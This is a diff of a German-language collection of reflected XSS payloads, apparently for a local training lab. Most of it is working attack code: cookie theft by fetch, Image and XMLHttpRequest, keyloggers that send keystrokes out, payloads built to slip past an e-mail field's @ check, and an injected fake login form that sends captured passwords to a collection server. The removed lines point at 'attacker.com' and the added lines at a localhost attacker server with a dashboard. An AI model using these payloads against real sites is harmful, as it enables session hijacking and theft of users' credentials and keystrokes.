@@ -1,6 +1,18 @@
-# Reflected XSS Payloads
+# Reflected XSS Payloads - Vollständige Sammlung
 
-## Basis Payloads
+⚠️ **NUR FÜR BILDUNGSZWECKE IN KONTROLLIERTEN UMGEBUNGEN!**
+
+Diese Datei enthält XSS-Payloads für Testzwecke. Die Payloads sind in zwei Hauptkategorien unterteilt:
+- **Ohne Server**: Funktionieren eigenständig im Browser
+- **Mit Server**: Benötigen den Attacker-Server auf `http://localhost:3000`
+
+---
+
+# Teil 1: Angriffe OHNE Server
+
+Diese Payloads funktionieren eigenständig im Browser und benötigen keine externe Infrastruktur.
+
+## 1.1 Basis Payloads
 
 ### IMG-Tag mit onerror (EMPFOHLEN!)
 
@@ -138,57 +150,23 @@
 
 ---
 
-## Cookie-Diebstahl
+## 1.2 Cookie-Anzeige (ohne Server)
 
-### Cookies anzeigen
+### Cookies in Alert anzeigen
 
 ```html
 <img src=x onerror="alert(document.cookie)">
 ```
 
----
-
-### Cookies an Server senden (fetch)
+### Cookies in Console anzeigen
 
 ```html
-<img src=x onerror="fetch('https://attacker.com/steal?c='+document.cookie)">
+<img src=x onerror="console.log(document.cookie)">
 ```
 
 ---
 
-### Cookies an Server senden (Image)
-
-```html
-<img src=x onerror="new Image().src='https://attacker.com/steal?c='+document.cookie">
-```
-
----
-
-### Mit URL-Encoding
-
-```html
-<img src=x onerror="fetch('https://attacker.com/steal?c='+encodeURIComponent(document.cookie))">
-```
-
----
-
-### Via XMLHttpRequest
-
-```html
-<img src=x onerror="var x=new XMLHttpRequest();x.open('GET','https://attacker.com/steal?c='+document.cookie);x.send()">
-```
-
----
-
-### Cookies + URL + UserAgent
-
-```html
-<img src=x onerror="fetch('https://attacker.com/steal',{method:'POST',body:JSON.stringify({c:document.cookie,u:location.href,a:navigator.userAgent})})">
-```
-
----
-
-## Phishing
+## 1.3 Phishing Angriffe (ohne Server)
 
 ### Fake Login-Form
 
@@ -238,7 +216,7 @@
 
 ---
 
-## Keylogger
+## 1.4 Keylogger (ohne Server)
 
 ### Einfacher Keylogger (Console)
 
@@ -256,10 +234,218 @@
 
 ---
 
-### Keylogger der an Server sendet
+# Teil 2: Angriffe MIT Server
+
+Diese Payloads benötigen den Attacker-Server auf `http://localhost:3000`.
+
+## Hinweis: Server Setup
+
+**Server muss gestartet sein:**
+```bash
+cd attacker-server
+npm install
+npm start
+```
+
+**Dashboard öffnen:** `http://localhost:3000/dashboard`
+
+---
+
+## 2.1 Cookie-Diebstahl mit Server
+
+### Cookies an Server senden (fetch)
 
 ```html
-<img src=x onerror="var k='';document.onkeypress=function(e){k+=e.key;if(k.length>20){fetch('https://attacker.com/keys?d='+k);k=''}}">
+<img src=x onerror="fetch('http://localhost:3000/steal?c='+document.cookie)">
 ```
 
 ---
+
+### Cookies an Server senden (Image)
+
+```html
+<img src=x onerror="new Image().src='http://localhost:3000/steal?c='+document.cookie">
+```
+
+---
+
+### Cookies an Server senden (XMLHttpRequest)
+
+```html
+<img src=x onerror="var x=new XMLHttpRequest();x.open('GET','http://localhost:3000/steal?c='+document.cookie);x.send()">
+```
+
+---
+
+### Mit URL-Encoding
+
+```html
+<img src=x onerror="fetch('http://localhost:3000/steal?c='+encodeURIComponent(document.cookie))">
+```
+
+---
+
+### Cookies + URL + UserAgent (POST)
+
+```html
+<img src=x onerror="fetch('http://localhost:3000/steal',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({c:document.cookie,u:location.href,a:navigator.userAgent})})">
+```
+
+---
+
+## 2.2 Keylogger mit Server
+
+### Keylogger der an Server sendet (alle 20 Zeichen)
+
+```html
+<img src=x onerror="var k='';document.onkeypress=function(e){k+=e.key;if(k.length>20){fetch('http://localhost:3000/keys?d='+encodeURIComponent(k));k=''}}">
+```
+
+---
+
+### Keylogger mit kürzerer Übertragung (alle 10 Zeichen)
+
+```html
+<img src=x onerror="var k='';document.onkeypress=function(e){k+=e.key;if(k.length>10){new Image().src='http://localhost:3000/keys?d='+k;k=''}}">
+```
+
+---
+
+### Keylogger mit sofortiger Übertragung (jeder Tastendruck)
+
+```html
+<img src=x onerror="document.onkeypress=function(e){fetch('http://localhost:3000/keys?d='+e.key)}">
+```
+
+---
+
+## 2.3 Newsletter Payloads (mit @ und Server)
+
+Diese Payloads sind speziell für das Newsletter-Feld konzipiert, das ein @-Zeichen erfordert.
+
+### E-Mail mit Cookie-Diebstahl (fetch)
+
+```html
+test@test.de<img src=x onerror="fetch('http://localhost:3000/steal?c='+document.cookie)">
+```
+
+---
+
+### E-Mail mit Cookie-Diebstahl (Image)
+
+```html
+mail@example.com<img src=x onerror="new Image().src='http://localhost:3000/steal?c='+document.cookie">
+```
+
+---
+
+### E-Mail mit vollständigen Daten (POST)
+
+```html
+user@domain.de<img src=x onerror="fetch('http://localhost:3000/steal',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({c:document.cookie,u:location.href,a:navigator.userAgent})})">
+```
+
+---
+
+### E-Mail mit Keylogger
+
+```html
+test@test.de<img src=x onerror="var k='';document.onkeypress=function(e){k+=e.key;if(k.length>20){fetch('http://localhost:3000/keys?d='+k);k=''}}">
+```
+
+---
+
+## 2.4 Kombinations-Angriffe (mit Server)
+
+### Cookie-Diebstahl + Phishing Login-Form
+
+```html
+<img src=x onerror="fetch('http://localhost:3000/steal?c='+document.cookie);document.body.innerHTML='<div style=\"max-width:400px;margin:100px auto;padding:40px;background:white;border-radius:8px\"><h2 style=\"text-align:center\">Login</h2><form onsubmit=\"fetch(\\\'http://localhost:3000/keys?d=email:\\\'+document.getElementById(\\\'e\\\').value+\\\',pass:\\\'+document.getElementById(\\\'p\\\').value);return false\"><input id=\"e\" type=\"email\" placeholder=\"E-Mail\" style=\"width:100%;padding:12px;margin:10px 0;border:1px solid #ddd;border-radius:4px\"><input id=\"p\" type=\"password\" placeholder=\"Passwort\" style=\"width:100%;padding:12px;margin:10px 0;border:1px solid #ddd;border-radius:4px\"><button type=\"submit\" style=\"width:100%;background:#000;color:white;padding:12px;border:none;border-radius:4px;cursor:pointer\">Login</button></form></div>'">
+```
+
+---
+
+### Cookie-Diebstahl + Keylogger gleichzeitig
+
+```html
+<img src=x onerror="fetch('http://localhost:3000/steal?c='+document.cookie);var k='';document.onkeypress=function(e){k+=e.key;if(k.length>20){fetch('http://localhost:3000/keys?d='+k);k=''}}">
+```
+
+---
+
+# Teil 3: Server-Setup und Testing
+
+## 3.1 Server starten
+
+```bash
+cd attacker-server
+npm install
+npm start
+```
+
+## 3.2 Dashboard öffnen
+
+Browser: `http://localhost:3000/dashboard`
+
+## 3.3 XSS Payload testen
+
+Beispiel im Suchfeld:
+```html
+<img src=x onerror="fetch('http://localhost:3000/steal?c='+document.cookie)">
+```
+
+## 3.4 Gestohlene Daten ansehen
+
+- Im Dashboard erscheinen die Daten sofort
+- Auto-Refresh alle 5 Sekunden
+- Console zeigt auch Logs
+
+---
+
+## 3.5 Wichtige URLs
+
+- Server Hauptseite: `http://localhost:3000`
+- Dashboard: `http://localhost:3000/dashboard`
+- Cookie Steal Endpoint: `http://localhost:3000/steal?c=...`
+- Keylogger Endpoint: `http://localhost:3000/keys?d=...`
+
+---
+
+## 3.6 Beispiel: Vollständiger Angriff
+
+**URL in Browser eingeben:**
+```
+http://localhost:8080/index.html?search=<img src=x onerror="fetch('http://localhost:3000/steal?c='+document.cookie)">
+```
+
+**Was passiert:**
+1. XSS Payload wird ausgeführt
+2. Cookies werden an Attacker Server gesendet
+3. Im Dashboard erscheinen die gestohlenen Cookies
+4. Console zeigt Details an
+
+**Im Dashboard siehst du:**
+- Alle gestohlenen Cookies
+- Zeitstempel
+- IP-Adresse
+- User-Agent
+- Weitere Daten je nach Payload
+
+---
+
+# Zusammenfassung
+
+## Angriffe OHNE Server:
+- Einfache Alert-Boxen
+- Cookie-Anzeige im Browser
+- Phishing-Formulare (Daten im Alert)
+- Keylogger (Console/Alert)
+
+## Angriffe MIT Server:
+- Cookie-Diebstahl mit Übertragung
+- Keylogger mit Datenübertragung
+- Newsletter-spezifische Angriffe
+- Kombinations-Angriffe
+- Vollständige Datenerfassung
+
+**Server-Vorteil:** Persistente Speicherung und Echtzeit-Monitoring aller gestohlenen Daten im Dashboard.
